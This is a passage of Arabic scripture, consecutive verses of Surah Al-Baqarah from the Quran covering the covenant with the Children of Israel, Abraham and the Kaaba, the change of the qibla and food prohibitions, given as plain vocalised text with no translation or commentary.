وَاِذَا قِيْلَ لَهُمْ اٰمِنُوْا بِمَآ اَنْزَلَ اللّٰهُ قَالُوْا نُؤْمِنُ بِمَآ اُنْزِلَ عَلَيْنَا وَيَكْفُرُوْنَ بِمَا وَرَاۤءَهٗ وَهُوَ الْحَقُّ مُصَدِّقًا لِّمَا مَعَهُمْ ۗ قُلْ فَلِمَ تَقْتُلُوْنَ اَنْبِيَاۤءَ اللّٰهِ مِنْ قَبْلُ اِنْ كُنْتُمْ مُّؤْمِنِيْنَ
وَلَقَدْ جَاۤءَكُمْ مُّوْسٰى بِالْبَيِّنٰتِ ثُمَّ اتَّخَذْتُمُ الْعِجْلَ مِنْۢ بَعْدِهٖ وَاَنْتُمْ ظٰلِمُوْنَ
وَاِذْ اَخَذْنَا مِيْثَاقَكُمْ وَرَفَعْنَا فَوْقَكُمُ الطُّوْرَ ۗ خُذُوْا مَآ اٰتَيْنٰكُمْ بِقُوَّةٍ وَّاسْمَعُوْا ۗ قَالُوْا سَمِعْنَا وَعَصَيْنَا وَاُشْرِبُوْا فِيْ قُلُوْبِهِمُ الْعِجْلَ بِكُفْرِهِمْ ۗ قُلْ بِئْسَمَا يَأْمُرُكُمْ بِهٖٓ اِيْمَانُكُمْ اِنْ كُنْتُمْ مُّؤْمِنِيْنَ
قُلْ اِنْ كَانَتْ لَكُمُ الدَّارُ الْاٰخِرَةُ عِنْدَ اللّٰهِ خَالِصَةً مِّنْ دُوْنِ النَّاسِ فَتَمَنَّوُا الْمَوْتَ اِنْ كُنْتُمْ صٰدِقِيْنَ
وَلَنْ يَّتَمَنَّوْهُ اَبَدًا ۢ بِمَا قَدَّمَتْ اَيْدِيْهِمْ ۗ وَاللّٰهُ عَلِيْمٌۢ بِالظّٰلِمِيْنَ
وَلَتَجِدَنَّهُمْ اَحْرَصَ النَّاسِ عَلٰى حَيٰوةٍ ۚ وَمِنَ الَّذِيْنَ اَشْرَكُوْا ۚ يَوَدُّ اَحَدُهُمْ لَوْ يُعَمَّرُ اَلْفَ سَنَةٍ ۚ وَمَا هُوَ بِمُزَحْزِحِهٖ مِنَ الْعَذَابِ اَنْ يُّعَمَّرَ ۗ وَاللّٰهُ بَصِيْرٌۢ بِمَا يَعْمَلُوْنَ
قُلْ مَنْ كَانَ عَدُوًّا لِّجِبْرِيْلَ فَاِنَّهٗ نَزَّلَهٗ عَلٰى قَلْبِكَ بِاِذْنِ اللّٰهِ مُصَدِّقًا لِّمَا بَيْنَ يَدَيْهِ وَهُدًى وَّبُشْرٰى لِلْمُؤْمِنِيْنَ
مَنْ كَانَ عَدُوًّا لِّلّٰهِ وَمَلٰۤىِٕكَتِهٖ وَرُسُلِهٖ وَجِبْرِيْلَ وَمِيْكٰىلَ فَاِنَّ اللّٰهَ عَدُوٌّ لِّلْكٰفِرِيْنَ
وَلَقَدْ اَنْزَلْنَآ اِلَيْكَ اٰيٰتٍۢ بَيِّنٰتٍ ۚ وَمَا يَكْفُرُ بِهَآ اِلَّا الْفٰسِقُوْنَ
اَوَكُلَّمَا عٰهَدُوْا عَهْدًا نَّبَذَهٗ فَرِيْقٌ مِّنْهُمْ ۗ بَلْ اَكْثَرُهُمْ لَا يُؤْمِنُوْنَ
وَلَمَّا جَاۤءَهُمْ رَسُوْلٌ مِّنْ عِنْدِ اللّٰهِ مُصَدِّقٌ لِّمَا مَعَهُمْ نَبَذَ فَرِيْقٌ مِّنَ الَّذِيْنَ اُوْتُوا الْكِتٰبَ كِتٰبَ اللّٰهِ وَرَاۤءَ ظُهُوْرِهِمْ كَاَنَّهُمْ لَا يَعْلَمُوْنَ
وَاتَّبَعُوْا مَا تَتْلُوا الشَّيٰطِيْنُ عَلٰى مُلْكِ سُلَيْمٰنَ ۚ وَمَا كَفَرَ سُلَيْمٰنُ وَلٰكِنَّ الشَّيٰطِيْنَ كَفَرُوْا يُعَلِّمُوْنَ النَّاسَ السِّحْرَ وَمَآ اُنْزِلَ عَلَى الْمَلَكَيْنِ بِبَابِلَ هَارُوْتَ وَمَارُوْتَ ۗ وَمَا يُعَلِّمٰنِ مِنْ اَحَدٍ حَتّٰى يَقُوْلَآ اِنَّمَا نَحْنُ فِتْنَةٌ فَلَا تَكْفُرْ ۗ فَيَتَعَلَّمُوْنَ مِنْهُمَا مَا يُفَرِّقُوْنَ بِهٖ بَيْنَ الْمَرْءِ وَزَوْجِهٖ ۗ وَمَا هُمْ بِضَاۤرِّيْنَ بِهٖ مِنْ اَحَدٍ اِلَّا بِاِذْنِ اللّٰهِ ۗ وَيَتَعَلَّمُوْنَ مَا يَضُرُّهُمْ وَلَا يَنْفَعُهُمْ ۗ وَلَقَدْ عَلِمُوْا لَمَنِ اشْتَرٰىهُ مَا لَهٗ فِى الْاٰخِرَةِ مِنْ خَلَاقٍ ۗ وَلَبِئْسَ مَا شَرَوْا بِهٖٓ اَنْفُسَهُمْ ۗ لَوْ كَانُوْا يَعْلَمُوْنَ
وَلَوْ اَنَّهُمْ اٰمَنُوْا وَاتَّقَوْا لَمَثُوْبَةٌ مِّنْ عِنْدِ اللّٰهِ خَيْرٌ ۗ لَوْ كَانُوْا يَعْلَمُوْنَ
يٰٓاَيُّهَا الَّذِيْنَ اٰمَنُوْا لَا تَقُوْلُوْا رَاعِنَا وَقُوْلُوا انْظُرْنَا وَاسْمَعُوْا ۗ وَلِلْكٰفِرِيْنَ عَذَابٌ اَلِيْمٌ
مَّا يَوَدُّ الَّذِيْنَ كَفَرُوْا مِنْ اَهْلِ الْكِتٰبِ وَلَا الْمُشْرِكِيْنَ اَنْ يُّنَزَّلَ عَلَيْكُمْ مِّنْ خَيْرٍ مِّنْ رَّبِّكُمْ ۗ وَاللّٰهُ يَخْتَصُّ بِرَحْمَتِهٖ مَنْ يَّشَاۤءُ ۗ وَاللّٰهُ ذُو الْفَضْلِ الْعَظِيْمِ
مَا نَنْسَخْ مِنْ اٰيَةٍ اَوْ نُنْسِهَا نَأْتِ بِخَيْرٍ مِّنْهَآ اَوْ مِثْلِهَا ۗ اَلَمْ تَعْلَمْ اَنَّ اللّٰهَ عَلٰى كُلِّ شَيْءٍ قَدِيْرٌ
اَلَمْ تَعْلَمْ اَنَّ اللّٰهَ لَهٗ مُلْكُ السَّمٰوٰتِ وَالْاَرْضِ ۗ وَمَا لَكُمْ مِّنْ دُوْنِ اللّٰهِ مِنْ وَّلِيٍّ وَّلَا نَصِيْرٍ
اَمْ تُرِيْدُوْنَ اَنْ تَسْـَٔلُوْا رَسُوْلَكُمْ كَمَا سُىِٕلَ مُوْسٰى مِنْ قَبْلُ ۗ وَمَنْ يَّتَبَدَّلِ الْكُفْرَ بِالْاِيْمَانِ فَقَدْ ضَلَّ سَوَاۤءَ السَّبِيْلِ
وَدَّ كَثِيْرٌ مِّنْ اَهْلِ الْكِتٰبِ لَوْ يَرُدُّوْنَكُمْ مِّنْۢ بَعْدِ اِيْمَانِكُمْ كُفَّارًا ۚ حَسَدًا مِّنْ عِنْدِ اَنْفُسِهِمْ مِّنْۢ بَعْدِ مَا تَبَيَّنَ لَهُمُ الْحَقُّ ۚ فَاعْفُوْا وَاصْفَحُوْا حَتّٰى يَأْتِيَ اللّٰهُ بِاَمْرِهٖ ۗ اِنَّ اللّٰهَ عَلٰى كُلِّ شَيْءٍ قَدِيْرٌ
وَاَقِيْمُوا الصَّلٰوةَ وَاٰتُوا الزَّكٰوةَ ۗ وَمَا تُقَدِّمُوْا لِاَنْفُسِكُمْ مِّنْ خَيْرٍ تَجِدُوْهُ عِنْدَ اللّٰهِ ۗ اِنَّ اللّٰهَ بِمَا تَعْمَلُوْنَ بَصِيْرٌ
وَقَالُوْا لَنْ يَّدْخُلَ الْجَنَّةَ اِلَّا مَنْ كَانَ هُوْدًا اَوْ نَصٰرٰى ۗ تِلْكَ اَمَانِيُّهُمْ ۗ قُلْ هَاتُوْا بُرْهَانَكُمْ اِنْ كُنْتُمْ صٰدِقِيْنَ
بَلٰى مَنْ اَسْلَمَ وَجْهَهٗ لِلّٰهِ وَهُوَ مُحْسِنٌ فَلَهٗٓ اَجْرُهٗ عِنْدَ رَبِّهٖ ۖ وَلَا خَوْفٌ عَلَيْهِمْ وَلَا هُمْ يَحْزَنُوْنَ
وَقَالَتِ الْيَهُوْدُ لَيْسَتِ النَّصٰرٰى عَلٰى شَيْءٍ ۖ وَّقَالَتِ النَّصٰرٰى لَيْسَتِ الْيَهُوْدُ عَلٰى شَيْءٍ ۙ وَّهُمْ يَتْلُوْنَ الْكِتٰبَ ۗ كَذٰلِكَ قَالَ الَّذِيْنَ لَا يَعْلَمُوْنَ مِثْلَ قَوْلِهِمْ ۚ فَاللّٰهُ يَحْكُمُ بَيْنَهُمْ يَوْمَ الْقِيٰمَةِ فِيْمَا كَانُوْا فِيْهِ يَخْتَلِفُوْنَ
وَمَنْ اَظْلَمُ مِمَّنْ مَّنَعَ مَسٰجِدَ اللّٰهِ اَنْ يُّذْكَرَ فِيْهَا اسْمُهٗ وَسَعٰى فِيْ خَرَابِهَا ۗ اُولٰۤىِٕكَ مَا كَانَ لَهُمْ اَنْ يَّدْخُلُوْهَآ اِلَّا خَاۤىِٕفِيْنَ ۚ لَهُمْ فِى الدُّنْيَا خِزْيٌ وَّلَهُمْ فِى الْاٰخِرَةِ عَذَابٌ عَظِيْمٌ
وَلِلّٰهِ الْمَشْرِقُ وَالْمَغْرِبُ فَاَيْنَمَا تُوَلُّوْا فَثَمَّ وَجْهُ اللّٰهِ ۗ اِنَّ اللّٰهَ وَاسِعٌ عَلِيْمٌ
وَقَالُوا اتَّخَذَ اللّٰهُ وَلَدًا ۙ سُبْحٰنَهٗ ۗ بَلْ لَّهٗ مَا فِى السَّمٰوٰتِ وَالْاَرْضِ ۗ كُلٌّ لَّهٗ قَانِتُوْنَ
بَدِيْعُ السَّمٰوٰتِ وَالْاَرْضِ ۗ وَ اِذَا قَضٰٓى اَمْرًا فَاِنَّمَا يَقُوْلُ لَهٗ كُنْ فَيَكُوْنُ
وَقَالَ الَّذِيْنَ لَا يَعْلَمُوْنَ لَوْلَا يُكَلِّمُنَا اللّٰهُ اَوْ تَأْتِيْنَآ اٰيَةٌ ۗ كَذٰلِكَ قَالَ الَّذِيْنَ مِنْ قَبْلِهِمْ مِّثْلَ قَوْلِهِمْ ۘ تَشَابَهَتْ قُلُوْبُهُمْ ۗ قَدْ بَيَّنَّا الْاٰيٰتِ لِقَوْمٍ يُّوْقِنُوْنَ
اِنَّآ اَرْسَلْنٰكَ بِالْحَقِّ بَشِيْرًا وَّنَذِيْرًا ۙ وَّلَا تُسْـَٔلُ عَنْ اَصْحٰبِ الْجَحِيْمِ
وَلَنْ تَرْضٰى عَنْكَ الْيَهُوْدُ وَلَا النَّصٰرٰى حَتّٰى تَتَّبِعَ مِلَّتَهُمْ ۗ قُلْ اِنَّ هُدَى اللّٰهِ هُوَ الْهُدٰى ۗ وَلَىِٕنِ اتَّبَعْتَ اَهْوَاۤءَهُمْ بَعْدَ الَّذِيْ جَاۤءَكَ مِنَ الْعِلْمِ ۙ مَا لَكَ مِنَ اللّٰهِ مِنْ وَّلِيٍّ وَّلَا نَصِيْرٍ
الَّذِيْنَ اٰتَيْنٰهُمُ الْكِتٰبَ يَتْلُوْنَهٗ حَقَّ تِلَاوَتِهٖ ۗ اُولٰۤىِٕكَ يُؤْمِنُوْنَ بِهٖ ۗ وَمَنْ يَّكْفُرْ بِهٖ فَاُولٰۤىِٕكَ هُمُ الْخٰسِرُوْنَ
يٰبَنِيْٓ اِسْرَاۤءِيْلَ اذْكُرُوْا نِعْمَتِيَ الَّتِيْٓ اَنْعَمْتُ عَلَيْكُمْ وَاَنِّيْ فَضَّلْتُكُمْ عَلَى الْعٰلَمِيْنَ
وَاتَّقُوْا يَوْمًا لَّا تَجْزِيْ نَفْسٌ عَنْ نَّفْسٍ شَيْـًٔا وَّلَا يُقْبَلُ مِنْهَا عَدْلٌ وَّلَا تَنْفَعُهَا شَفَاعَةٌ وَّلَا هُمْ يُنْصَرُوْنَ
وَاِذِ ابْتَلٰٓى اِبْرٰهٖمَ رَبُّهٗ بِكَلِمٰتٍ فَاَتَمَّهُنَّ ۗ قَالَ اِنِّيْ جَاعِلُكَ لِلنَّاسِ اِمَامًا ۗ قَالَ وَمِنْ ذُرِّيَّتِيْ ۗ قَالَ لَا يَنَالُ عَهْدِى الظّٰلِمِيْنَ
وَاِذْ جَعَلْنَا الْبَيْتَ مَثَابَةً لِّلنَّاسِ وَاَمْنًا ۗ وَاتَّخِذُوْا مِنْ مَّقَامِ اِبْرٰهٖمَ مُصَلًّى ۗ وَعَهِدْنَآ اِلٰٓى اِبْرٰهٖمَ وَاِسْمٰعِيْلَ اَنْ طَهِّرَا بَيْتِيَ لِلطَّاۤىِٕفِيْنَ وَالْعٰكِفِيْنَ وَالرُّكَّعِ السُّجُوْدِ
وَاِذْ قَالَ اِبْرٰهٖمُ رَبِّ اجْعَلْ هٰذَا بَلَدًا اٰمِنًا وَّارْزُقْ اَهْلَهٗ مِنَ الثَّمَرٰتِ مَنْ اٰمَنَ مِنْهُمْ بِاللّٰهِ وَالْيَوْمِ الْاٰخِرِ ۗ قَالَ وَمَنْ كَفَرَ فَاُمَتِّعُهٗ قَلِيْلًا ثُمَّ اَضْطَرُّهٗٓ اِلٰى عَذَابِ النَّارِ ۗ وَبِئْسَ الْمَصِيْرُ
وَاِذْ يَرْفَعُ اِبْرٰهٖمُ الْقَوَاعِدَ مِنَ الْبَيْتِ وَاِسْمٰعِيْلُ ۗ رَبَّنَا تَقَبَّلْ مِنَّا ۗ اِنَّكَ اَنْتَ السَّمِيْعُ الْعَلِيْمُ
رَبَّنَا وَاجْعَلْنَا مُسْلِمَيْنِ لَكَ وَمِنْ ذُرِّيَّتِنَآ اُمَّةً مُّسْلِمَةً لَّكَ ۖ وَاَرِنَا مَنَاسِكَنَا وَتُبْ عَلَيْنَا ۚ اِنَّكَ اَنْتَ التَّوَّابُ الرَّحِيْمُ
رَبَّنَا وَابْعَثْ فِيْهِمْ رَسُوْلًا مِّنْهُمْ يَتْلُوْا عَلَيْهِمْ اٰيٰتِكَ وَيُعَلِّمُهُمُ الْكِتٰبَ وَالْحِكْمَةَ وَيُزَكِّيْهِمْ ۗ اِنَّكَ اَنْتَ الْعَزِيْزُ الْحَكِيْمُ
وَمَنْ يَّرْغَبُ عَنْ مِّلَّةِ اِبْرٰهٖمَ اِلَّا مَنْ سَفِهَ نَفْسَهٗ ۗ وَلَقَدِ اصْطَفَيْنٰهُ فِى الدُّنْيَا ۚ وَاِنَّهٗ فِى الْاٰخِرَةِ لَمِنَ الصّٰلِحِيْنَ
اِذْ قَالَ لَهٗ رَبُّهٗٓ اَسْلِمْ ۙ قَالَ اَسْلَمْتُ لِرَبِّ الْعٰلَمِيْنَ
وَوَصّٰى بِهَآ اِبْرٰهٖمُ بَنِيْهِ وَيَعْقُوْبُ ۗ يٰبَنِيَّ اِنَّ اللّٰهَ اصْطَفٰى لَكُمُ الدِّيْنَ فَلَا تَمُوْتُنَّ اِلَّا وَاَنْتُمْ مُّسْلِمُوْنَ
اَمْ كُنْتُمْ شُهَدَاۤءَ اِذْ حَضَرَ يَعْقُوْبَ الْمَوْتُ ۙ اِذْ قَالَ لِبَنِيْهِ مَا تَعْبُدُوْنَ مِنْۢ بَعْدِيْ ۗ قَالُوْا نَعْبُدُ اِلٰهَكَ وَاِلٰهَ اٰبَاۤىِٕكَ اِبْرٰهٖمَ وَاِسْمٰعِيْلَ وَاِسْحٰقَ اِلٰهًا وَّاحِدًا ۖ وَّنَحْنُ لَهٗ مُسْلِمُوْنَ
تِلْكَ اُمَّةٌ قَدْ خَلَتْ ۚ لَهَا مَا كَسَبَتْ وَلَكُمْ مَّا كَسَبْتُمْ ۚ وَلَا تُسْـَٔلُوْنَ عَمَّا كَانُوْا يَعْمَلُوْنَ
وَقَالُوْا كُوْنُوْا هُوْدًا اَوْ نَصٰرٰى تَهْتَدُوْا ۗ قُلْ بَلْ مِلَّةَ اِبْرٰهٖمَ حَنِيْفًا ۗ وَمَا كَانَ مِنَ الْمُشْرِكِيْنَ
قُوْلُوْٓا اٰمَنَّا بِاللّٰهِ وَمَآ اُنْزِلَ اِلَيْنَا وَمَآ اُنْزِلَ اِلٰٓى اِبْرٰهٖمَ وَاِسْمٰعِيْلَ وَاِسْحٰقَ وَيَعْقُوْبَ وَالْاَسْبَاطِ وَمَآ اُوْتِيَ مُوْسٰى وَعِيْسٰى وَمَآ اُوْتِيَ النَّبِيُّوْنَ مِنْ رَّبِّهِمْ ۚ لَا نُفَرِّقُ بَيْنَ اَحَدٍ مِّنْهُمْ ۖ وَنَحْنُ لَهٗ مُسْلِمُوْنَ
فَاِنْ اٰمَنُوْا بِمِثْلِ مَآ اٰمَنْتُمْ بِهٖ فَقَدِ اهْتَدَوْا ۚ وَاِنْ تَوَلَّوْا فَاِنَّمَا هُمْ فِيْ شِقَاقٍ ۚ فَسَيَكْفِيْكَهُمُ اللّٰهُ ۚ وَهُوَ السَّمِيْعُ الْعَلِيْمُ
صِبْغَةَ اللّٰهِ ۚ وَمَنْ اَحْسَنُ مِنَ اللّٰهِ صِبْغَةً ۖ وَّنَحْنُ لَهٗ عٰبِدُوْنَ
قُلْ اَتُحَاۤجُّوْنَنَا فِى اللّٰهِ وَهُوَ رَبُّنَا وَرَبُّكُمْ ۚ وَلَنَآ اَعْمَالُنَا وَلَكُمْ اَعْمَالُكُمْ ۚ وَنَحْنُ لَهٗ مُخْلِصُوْنَ
اَمْ تَقُوْلُوْنَ اِنَّ اِبْرٰهٖمَ وَاِسْمٰعِيْلَ وَاِسْحٰقَ وَيَعْقُوْبَ وَالْاَسْبَاطَ كَانُوْا هُوْدًا اَوْ نَصٰرٰى ۗ قُلْ ءَاَنْتُمْ اَعْلَمُ اَمِ اللّٰهُ ۗ وَمَنْ اَظْلَمُ مِمَّنْ كَتَمَ شَهَادَةً عِنْدَهٗ مِنَ اللّٰهِ ۗ وَمَا اللّٰهُ بِغَافِلٍ عَمَّا تَعْمَلُوْنَ
تِلْكَ اُمَّةٌ قَدْ خَلَتْ ۚ لَهَا مَا كَسَبَتْ وَلَكُمْ مَّا كَسَبْتُمْ ۚ وَلَا تُسْـَٔلُوْنَ عَمَّا كَانُوْا يَعْمَلُوْنَ
سَيَقُوْلُ السُّفَهَاۤءُ مِنَ النَّاسِ مَا وَلّٰىهُمْ عَنْ قِبْلَتِهِمُ الَّتِيْ كَانُوْا عَلَيْهَا ۗ قُلْ لِّلّٰهِ الْمَشْرِقُ وَالْمَغْرِبُ ۗ يَهْدِيْ مَنْ يَّشَاۤءُ اِلٰى صِرَاطٍ مُّسْتَقِيْمٍ
وَكَذٰلِكَ جَعَلْنٰكُمْ اُمَّةً وَّسَطًا لِّتَكُوْنُوْا شُهَدَاۤءَ عَلَى النَّاسِ وَيَكُوْنَ الرَّسُوْلُ عَلَيْكُمْ شَهِيْدًا ۗ وَمَا جَعَلْنَا الْقِبْلَةَ الَّتِيْ كُنْتَ عَلَيْهَآ اِلَّا لِنَعْلَمَ مَنْ يَّتَّبِعُ الرَّسُوْلَ مِمَّنْ يَّنْقَلِبُ عَلٰى عَقِبَيْهِ ۗ وَاِنْ كَانَتْ لَكَبِيْرَةً اِلَّا عَلَى الَّذِيْنَ هَدَى اللّٰهُ ۗ وَمَا كَانَ اللّٰهُ لِيُضِيْعَ اِيْمَانَكُمْ ۗ اِنَّ اللّٰهَ بِالنَّاسِ لَرَءُوْفٌ رَّحِيْمٌ
قَدْ نَرٰى تَقَلُّبَ وَجْهِكَ فِى السَّمَاۤءِ ۚ فَلَنُوَلِّيَنَّكَ قِبْلَةً تَرْضٰىهَا ۖ فَوَلِّ وَجْهَكَ شَطْرَ الْمَسْجِدِ الْحَرَامِ ۗ وَحَيْثُ مَا كُنْتُمْ فَوَلُّوْا وُجُوْهَكُمْ شَطْرَهٗ ۗ وَاِنَّ الَّذِيْنَ اُوْتُوا الْكِتٰبَ لَيَعْلَمُوْنَ اَنَّهُ الْحَقُّ مِنْ رَّبِّهِمْ ۗ وَمَا اللّٰهُ بِغَافِلٍ عَمَّا يَعْمَلُوْنَ
وَلَىِٕنْ اَتَيْتَ الَّذِيْنَ اُوْتُوا الْكِتٰبَ بِكُلِّ اٰيَةٍ مَّا تَبِعُوْا قِبْلَتَكَ ۚ وَمَآ اَنْتَ بِتَابِعٍ قِبْلَتَهُمْ ۚ وَمَا بَعْضُهُمْ بِتَابِعٍ قِبْلَةَ بَعْضٍ ۗ وَلَىِٕنِ اتَّبَعْتَ اَهْوَاۤءَهُمْ مِّنْۢ بَعْدِ مَا جَاۤءَكَ مِنَ الْعِلْمِ ۙ اِنَّكَ اِذًا لَّمِنَ الظّٰلِمِيْنَ
الَّذِيْنَ اٰتَيْنٰهُمُ الْكِتٰبَ يَعْرِفُوْنَهٗ كَمَا يَعْرِفُوْنَ اَبْنَاۤءَهُمْ ۘ وَاِنَّ فَرِيْقًا مِّنْهُمْ لَيَكْتُمُوْنَ الْحَقَّ وَهُمْ يَعْلَمُوْنَ
اَلْحَقُّ مِنْ رَّبِّكَ فَلَا تَكُوْنَنَّ مِنَ الْمُمْتَرِيْنَ
وَلِكُلٍّ وِّجْهَةٌ هُوَ مُوَلِّيْهَا ۖ فَاسْتَبِقُوا الْخَيْرٰتِ ۗ اَيْنَ مَا تَكُوْنُوْا يَأْتِ بِكُمُ اللّٰهُ جَمِيْعًا ۗ اِنَّ اللّٰهَ عَلٰى كُلِّ شَيْءٍ قَدِيْرٌ
وَمِنْ حَيْثُ خَرَجْتَ فَوَلِّ وَجْهَكَ شَطْرَ الْمَسْجِدِ الْحَرَامِ ۗ وَاِنَّهٗ لَلْحَقُّ مِنْ رَّبِّكَ ۗ وَمَا اللّٰهُ بِغَافِلٍ عَمَّا تَعْمَلُوْنَ
وَمِنْ حَيْثُ خَرَجْتَ فَوَلِّ وَجْهَكَ شَطْرَ الْمَسْجِدِ الْحَرَامِ ۗ وَحَيْثُ مَا كُنْتُمْ فَوَلُّوْا وُجُوْهَكُمْ شَطْرَهٗ ۙ لِئَلَّا يَكُوْنَ لِلنَّاسِ عَلَيْكُمْ حُجَّةٌ اِلَّا الَّذِيْنَ ظَلَمُوْا مِنْهُمْ فَلَا تَخْشَوْهُمْ وَاخْشَوْنِيْ ۙ وَلِاُتِمَّ نِعْمَتِيْ عَلَيْكُمْ وَلَعَلَّكُمْ تَهْتَدُوْنَ
كَمَآ اَرْسَلْنَا فِيْكُمْ رَسُوْلًا مِّنْكُمْ يَتْلُوْا عَلَيْكُمْ اٰيٰتِنَا وَيُزَكِّيْكُمْ وَيُعَلِّمُكُمُ الْكِتٰبَ وَالْحِكْمَةَ وَيُعَلِّمُكُمْ مَّا لَمْ تَكُوْنُوْا تَعْلَمُوْنَ
فَاذْكُرُوْنِيْٓ اَذْكُرْكُمْ وَاشْكُرُوْا لِيْ وَلَا تَكْفُرُوْنِ
يٰٓاَيُّهَا الَّذِيْنَ اٰمَنُوا اسْتَعِيْنُوْا بِالصَّبْرِ وَالصَّلٰوةِ ۗ اِنَّ اللّٰهَ مَعَ الصّٰبِرِيْنَ
وَلَا تَقُوْلُوْا لِمَنْ يُّقْتَلُ فِيْ سَبِيْلِ اللّٰهِ اَمْوَاتٌ ۗ بَلْ اَحْيَاۤءٌ وَّلٰكِنْ لَّا تَشْعُرُوْنَ
وَلَنَبْلُوَنَّكُمْ بِشَيْءٍ مِّنَ الْخَوْفِ وَالْجُوْعِ وَنَقْصٍ مِّنَ الْاَمْوَالِ وَالْاَنْفُسِ وَالثَّمَرٰتِ ۗ وَبَشِّرِ الصّٰبِرِيْنَ
الَّذِيْنَ اِذَآ اَصَابَتْهُمْ مُّصِيْبَةٌۙ قَالُوْٓا اِنَّا لِلّٰهِ وَاِنَّآ اِلَيْهِ رٰجِعُوْنَۗ
اُولٰۤىِٕكَ عَلَيْهِمْ صَلَوٰتٌ مِّنْ رَّبِّهِمْ وَرَحْمَةٌ ۗ وَاُولٰۤىِٕكَ هُمُ الْمُهْتَدُوْنَ
اِنَّ الصَّفَا وَالْمَرْوَةَ مِنْ شَعَاۤىِٕرِ اللّٰهِ ۚ فَمَنْ حَجَّ الْبَيْتَ اَوِ اعْتَمَرَ فَلَا جُنَاحَ عَلَيْهِ اَنْ يَّطَّوَّفَ بِهِمَا ۗ وَمَنْ تَطَوَّعَ خَيْرًا ۙ فَاِنَّ اللّٰهَ شَاكِرٌ عَلِيْمٌ
اِنَّ الَّذِيْنَ يَكْتُمُوْنَ مَآ اَنْزَلْنَا مِنَ الْبَيِّنٰتِ وَالْهُدٰى مِنْۢ بَعْدِ مَا بَيَّنّٰهُ لِلنَّاسِ فِى الْكِتٰبِ ۙ اُولٰۤىِٕكَ يَلْعَنُهُمُ اللّٰهُ وَيَلْعَنُهُمُ اللّٰعِنُوْنَۙ
اِلَّا الَّذِيْنَ تَابُوْا وَاَصْلَحُوْا وَبَيَّنُوْا فَاُولٰۤىِٕكَ اَتُوْبُ عَلَيْهِمْ ۚ وَاَنَا التَّوَّابُ الرَّحِيْمُ
اِنَّ الَّذِيْنَ كَفَرُوْا وَمَاتُوْا وَهُمْ كُفَّارٌ اُولٰۤىِٕكَ عَلَيْهِمْ لَعْنَةُ اللّٰهِ وَالْمَلٰۤىِٕكَةِ وَالنَّاسِ اَجْمَعِيْنَۙ
خٰلِدِيْنَ فِيْهَا ۚ لَا يُخَفَّفُ عَنْهُمُ الْعَذَابُ وَلَا هُمْ يُنْظَرُوْنَ
وَاِلٰهُكُمْ اِلٰهٌ وَّاحِدٌ ۚ لَآ اِلٰهَ اِلَّا هُوَ الرَّحْمٰنُ الرَّحِيْمُ
اِنَّ فِيْ خَلْقِ السَّمٰوٰتِ وَالْاَرْضِ وَاخْتِلَافِ الَّيْلِ وَالنَّهَارِ وَالْفُلْكِ الَّتِيْ تَجْرِيْ فِى الْبَحْرِ بِمَا يَنْفَعُ النَّاسَ وَمَآ اَنْزَلَ اللّٰهُ مِنَ السَّمَاۤءِ مِنْ مَّاۤءٍ فَاَحْيَا بِهِ الْاَرْضَ بَعْدَ مَوْتِهَا وَبَثَّ فِيْهَا مِنْ كُلِّ دَاۤبَّةٍ ۖ وَّتَصْرِيْفِ الرِّيٰحِ وَالسَّحَابِ الْمُسَخَّرِ بَيْنَ السَّمَاۤءِ وَالْاَرْضِ لَاٰيٰتٍ لِّقَوْمٍ يَّعْقِلُوْنَ
وَمِنَ النَّاسِ مَنْ يَّتَّخِذُ مِنْ دُوْنِ اللّٰهِ اَنْدَادًا يُّحِبُّوْنَهُمْ كَحُبِّ اللّٰهِ ۗ وَالَّذِيْنَ اٰمَنُوْٓا اَشَدُّ حُبًّا لِّلّٰهِ ۗ وَلَوْ يَرَى الَّذِيْنَ ظَلَمُوْٓا اِذْ يَرَوْنَ الْعَذَابَۙ اَنَّ الْقُوَّةَ لِلّٰهِ جَمِيْعًا ۙ وَّاَنَّ اللّٰهَ شَدِيْدُ الْعَذَابِ
اِذْ تَبَرَّاَ الَّذِيْنَ اتُّبِعُوْا مِنَ الَّذِيْنَ اتَّبَعُوْا وَرَاَوُا الْعَذَابَ وَتَقَطَّعَتْ بِهِمُ الْاَسْبَابُ
وَقَالَ الَّذِيْنَ اتَّبَعُوْا لَوْ اَنَّ لَنَا كَرَّةً فَنَتَبَرَّاَ مِنْهُمْ كَمَا تَبَرَّءُوْا مِنَّا ۗ كَذٰلِكَ يُرِيْهِمُ اللّٰهُ اَعْمَالَهُمْ حَسَرٰتٍ عَلَيْهِمْ ۗ وَمَا هُمْ بِخٰرِجِيْنَ مِنَ النَّارِ
يٰٓاَيُّهَا النَّاسُ كُلُوْا مِمَّا فِى الْاَرْضِ حَلٰلًا طَيِّبًا ۖ وَّلَا تَتَّبِعُوْا خُطُوٰتِ الشَّيْطٰنِ ۗ اِنَّهٗ لَكُمْ عَدُوٌّ مُّبِيْنٌ
اِنَّمَا يَأْمُرُكُمْ بِالسُّوْۤءِ وَالْفَحْشَاۤءِ وَاَنْ تَقُوْلُوْا عَلَى اللّٰهِ مَا لَا تَعْلَمُوْنَ
وَاِذَا قِيْلَ لَهُمُ اتَّبِعُوْا مَآ اَنْزَلَ اللّٰهُ قَالُوْا بَلْ نَتَّبِعُ مَآ اَلْفَيْنَا عَلَيْهِ اٰبَاۤءَنَا ۗ اَوَلَوْ كَانَ اٰبَاۤؤُهُمْ لَا يَعْقِلُوْنَ شَيْـًٔا وَّلَا يَهْتَدُوْنَ
وَمَثَلُ الَّذِيْنَ كَفَرُوْا كَمَثَلِ الَّذِيْ يَنْعِقُ بِمَا لَا يَسْمَعُ اِلَّا دُعَاۤءً وَّنِدَاۤءً ۗ صُمٌّۢ بُكْمٌ عُمْيٌ فَهُمْ لَا يَعْقِلُوْنَ
يٰٓاَيُّهَا الَّذِيْنَ اٰمَنُوْا كُلُوْا مِنْ طَيِّبٰتِ مَا رَزَقْنٰكُمْ وَاشْكُرُوْا لِلّٰهِ اِنْ كُنْتُمْ اِيَّاهُ تَعْبُدُوْنَ
اِنَّمَا حَرَّمَ عَلَيْكُمُ الْمَيْتَةَ وَالدَّمَ وَلَحْمَ الْخِنْزِيْرِ وَمَآ اُهِلَّ بِهٖ لِغَيْرِ اللّٰهِ ۚ فَمَنِ اضْطُرَّ غَيْرَ بَاغٍ وَّلَا عَادٍ فَلَآ اِثْمَ عَلَيْهِ ۗ اِنَّ اللّٰهَ غَفُوْرٌ رَّحِيْمٌ
